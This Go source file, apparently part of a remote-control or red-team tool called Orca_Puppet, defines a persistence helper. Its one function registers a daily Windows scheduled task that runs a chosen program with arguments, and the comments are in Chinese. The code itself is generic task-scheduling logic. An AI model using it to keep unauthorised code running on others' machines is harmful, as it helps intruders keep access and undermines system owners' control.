package persistopt

import (
	"Orca_Puppet/define/debug"
	"github.com/capnspacehook/taskmaster"
	"time"
)

func AddWinTask(name, path, args string, tm time.Time) error {
	//创建初始化计划任务
	taskService, err := taskmaster.Connect()
	if err != nil {
		debug.DebugPrint(err.Error())
	}

	defer taskService.Disconnect()
	//定义新的计划任务
	newTaskDef := taskService.NewTaskDefinition()
	//添加执行程序的路径和参数
	newTaskDef.AddAction(taskmaster.ExecAction{
		Path: path,
		Args: args,
	})
	//定义计划任务程序的执行时间等
	newTaskDef.AddTrigger(taskmaster.DailyTrigger{
		DayInterval: 1,
		TaskTrigger: taskmaster.TaskTrigger{
			Enabled:       true,
			StartBoundary: tm,
		},
	})

	//创建计划任务
	resp, _, err := taskService.CreateTask(name, newTaskDef, true)
	if err != nil {
		return err
	}
	debug.DebugPrint(resp.Name + " add successfully")
	return nil
}
